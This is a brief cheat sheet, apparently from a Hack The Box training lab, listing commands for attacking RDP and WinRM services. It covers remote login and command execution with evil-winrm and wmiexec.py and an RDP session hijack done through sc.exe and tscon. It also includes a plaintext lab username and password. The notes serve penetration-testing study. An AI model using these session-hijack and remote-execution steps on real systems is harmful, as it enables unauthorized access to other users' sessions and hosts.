Port: 3389
#### Windows Remote Management

|**Command**|**Description**|
|---|---|
|`rdp-sec-check.pl <FQDN/IP>`|Check the security settings of the RDP service.|
|`xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>`|Log in to the RDP server from Linux.|
|`evil-winrm -i <FQDN/IP> -u <user> -p <password>`|Log in to the WinRM server.|
|`wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"`|Execute command using the WMI service.|


#### RDP Session Hijacking

##### Check for Sessions

```cmd
query user
```

##### Create hijack service
```cmd-session
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```
##### start service 
```cmd-session
C:\htb> net start sessionhijack
```

#### RDP Session with shared Folder
```shell
xfreerdp /u:mlefay /p:"Plain Human work!" /v:172.16.5.35 /drive:linux,/home/htb-ac-711424/skill /dynamic-resolution
```
